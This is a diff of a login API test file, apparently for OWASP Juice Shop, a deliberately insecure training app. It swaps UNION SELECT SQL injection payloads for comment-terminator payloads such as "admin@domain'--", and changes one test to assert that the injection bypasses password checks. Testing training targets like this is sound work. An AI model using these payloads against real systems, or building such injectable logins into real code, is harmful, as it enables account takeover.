@@ -8,10 +8,7 @@ import assert from 'node:assert/strict'
 import request from 'supertest'
 import type { Express } from 'express'
 import config from 'config'
-import * as security from '../../lib/insecurity'
 import { createTestApp } from './helpers/setup'
-
-const unionLoginAs = (condition: string, password: string) => `' UNION SELECT id, username, email, '${security.hashPassword(password)}', role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt FROM Users WHERE ${condition}--`
 
 let app: Express
 
@@ -155,7 +152,7 @@ void describe('/rest/user/login', () => {
     assert.equal(typeof res.body.authentication.token, 'string')
   })
 
-  void it('POST login with WHERE-clause disabling SQL injection attack does not bypass password verification', async () => {
+  void it('POST login with WHERE-clause disabling SQL injection attack', async () => {
     const res = await request(app)
       .post('/rest/user/login')
       .set({ 'content-type': 'application/json' })
@@ -164,7 +161,9 @@ void describe('/rest/user/login', () => {
         password: undefined
       })
 
-    assert.equal(res.status, 401)
+    assert.equal(res.status, 200)
+    assert.ok(res.headers['content-type']?.includes('application/json'))
+    assert.equal(typeof res.body.authentication.token, 'string')
   })
 
   void it('POST login with known email "admin@juice-sh.op" in SQL injection attack', async () => {
@@ -172,8 +171,8 @@ void describe('/rest/user/login', () => {
       .post('/rest/user/login')
       .set({ 'content-type': 'application/json' })
       .send({
-        email: unionLoginAs(`email = 'admin@${config.get<string>('application.domain')}'`, 'a'),
-        password: 'a'
+        email: 'admin@' + config.get<string>('application.domain') + '\'--',
+        password: undefined
       })
 
     assert.equal(res.status, 200)
@@ -186,8 +185,8 @@ void describe('/rest/user/login', () => {
       .post('/rest/user/login')
       .set({ 'content-type': 'application/json' })
       .send({
-        email: unionLoginAs(`email = 'jim@${config.get<string>('application.domain')}'`, 'a'),
-        password: 'a'
+        email: 'jim@' + config.get<string>('application.domain') + '\'--',
+        password: undefined
       })
 
     assert.equal(res.status, 200)
@@ -200,8 +199,8 @@ void describe('/rest/user/login', () => {
       .post('/rest/user/login')
       .set({ 'content-type': 'application/json' })
       .send({
-        email: unionLoginAs(`email = 'bender@${config.get<string>('application.domain')}'`, 'a'),
-        password: 'a'
+        email: 'bender@' + config.get<string>('application.domain') + '\'--',
+        password: undefined
       })
 
     assert.equal(res.status, 200)
@@ -214,8 +213,8 @@ void describe('/rest/user/login', () => {
       .post('/rest/user/login')
       .set({ 'content-type': 'application/json' })
       .send({
-        email: `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@${config.get<string>('application.domain')}' as 'email', '${security.hashPassword('12345')}' as 'password', 'accounting' as 'role', '' as deluxeToken, '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`,
-        password: '12345'
+        email: `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@${config.get<string>('application.domain')}' as 'email', '12345' as 'password', 'accounting' as 'role', '' as deluxeToken, '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`,
+        password: undefined
       })
 
     assert.equal(res.status, 200)
